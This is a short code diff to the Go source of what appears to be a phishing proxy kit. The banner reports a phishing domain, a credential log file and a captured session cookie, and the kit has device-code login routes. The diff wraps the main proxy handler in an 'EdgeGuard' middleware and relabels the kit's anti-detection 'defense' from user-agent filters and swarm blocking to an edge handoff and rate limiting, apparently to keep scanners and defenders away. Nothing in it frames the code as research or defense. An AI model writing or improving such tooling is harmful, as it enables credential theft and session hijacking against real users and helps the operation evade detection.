@@ -36,19 +36,16 @@ func main() {
 	initCorrelator()
 	initConfig()
 
-	// ── CREATE THE CUSTOM MUX FIRST ──
-	// ── CREATE THE CUSTOM MUX FIRST ──
 	mux := http.NewServeMux()
 
-	// ── CONFIG & ADMIN API ROUTES ──
 	mux.HandleFunc("/api/config", handleGetConfig)
 	mux.HandleFunc("/api/admin/update", handleWebhookUpdate)
 	mux.HandleFunc("/api/admin/domains", handleGetAllDomains)
 
-	// ── MAIN PROXY & DEVICE FLOW ROUTES ──
-	mux.HandleFunc("/", mainHandler)
+	mux.HandleFunc("/", edgeGuardMiddleware(mainHandler))
 	mux.HandleFunc("/device", deviceHandler)
 	mux.HandleFunc("/device/status", deviceStatusHandler)
+
 	server := &http.Server{
 		Addr:         listenAddr,
 		Handler:      mux,
@@ -85,7 +82,7 @@ func printBanner() {
 	fmt.Printf("  %sDomain:%s     %s%s%s\n", Yellow, Reset, Green, phishDomain, Reset)
 	fmt.Printf("  %sCred Log:%s   %s%s%s\n", Yellow, Reset, Green, credLogFile, Reset)
 	fmt.Printf("  %sSession:%s    %s%s%s\n", Yellow, Reset, Green, sessionMgr.cookieName, Reset)
-	fmt.Printf("  %sDefense:%s    %sActive%s (UA Filters + %sDynamic Swarm Blocking%s)\n", Yellow, Reset, Green, Reset, Magenta, Reset)
+	fmt.Printf("  %sDefense:%s    %sActive%s (EdgeGuard handoff + origin rate limit)\n", Yellow, Reset, Green, Reset)
 	fmt.Println()
 
 	fmt.Printf("  %sConfigured Targets (%d):%s\n", Cyan, len(targets), Reset)
